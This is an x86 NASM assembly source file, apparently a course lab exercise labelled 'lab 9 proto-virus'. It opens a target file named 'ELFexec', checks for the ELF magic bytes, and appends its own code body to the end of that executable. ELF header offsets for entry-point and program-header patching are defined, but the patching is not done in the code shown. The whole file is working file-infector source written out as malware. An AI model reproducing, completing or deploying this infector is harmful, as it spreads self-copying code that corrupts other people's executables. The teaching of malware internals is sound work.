%macro	syscall1 2
    mov	ebx, %2
    mov	eax, %1
    int	0x80
%endmacro

%macro	syscall3 4
    mov	edx, %4
    mov	ecx, %3
    mov	ebx, %2
    mov	eax, %1
    int	0x80
%endmacro

%macro  exit 1
    syscall1 1, %1
%endmacro

%macro  write 3
    syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
    syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
    syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
    syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
    syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define STDOUT	1

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

    global _start

section .text

virus_start:
get_my_loc:
    call    anchor
anchor:
    pop     edx
    mov		[ebp - 4], edx
    ret

_start:
    push	ebp
    mov		ebp, esp
    sub		esp, STK_RES    ; Set up ebp and reserve space on the stack for local storage

	.print_msg:
    call 	get_my_loc
    add		dword [ebp - 4], (OutStr - anchor)
    write	STDOUT, [ebp - 4], OutStrLen
	cmp		eax, 0
	jle		FailExit

	.open_file:
	call	get_my_loc
    add		dword [ebp - 4], (FileName - anchor)
    open	FileName, RDWR, 0
	cmp		eax, 0
	jle		FailExit
    mov		[ebp - 8], eax
    
	.read_file:
	call 	get_my_loc
	mov		eax, ebp
	sub		eax, 4
    read	[ebp - 8], eax, 4
	cmp		eax, 0
	jle		FailExit

	.check_elf:
	mov		eax, ebp
	sub		eax, 4
	cmp		byte [eax], 0x7F
    jne		FailExit
    cmp		byte [eax + 1], "E"
	jne		FailExit
	cmp		byte [eax + 2], "L"
	jne		FailExit
	cmp		byte [eax + 3], "F"
	jne		FailExit
	
	.infect_file:
	lseek	[ebp - 8], 0, SEEK_END
	mov		[ebp - 12], eax
	call	get_my_loc
	add		dword [ebp - 4], (virus_start - anchor)
	write	[ebp - 8], [ebp - 4], (virus_end - virus_start)
	cmp		eax, 0
	jle		FailExit

	.close_file:
	close 	[ebp - 8]
	cmp		eax, -1
	je		FailExit


VirusExit:
    exit 0               ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
FailExit:
	call	get_my_loc
	add		dword [ebp - 4], (FailStr - anchor)
	write	STDOUT, [ebp - 4], FailStrLen
    exit 1

FileName:	db "ELFexec", 0
FileNameLen equ $ - FileName - 1

OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
OutStrLen equ $ - OutStr - 1

FailStr:        db "perhaps not", 10 , 0
FailStrLen equ $ - FailStr - 1

PreviousEntryPoint: dd VirusExit
virus_end:



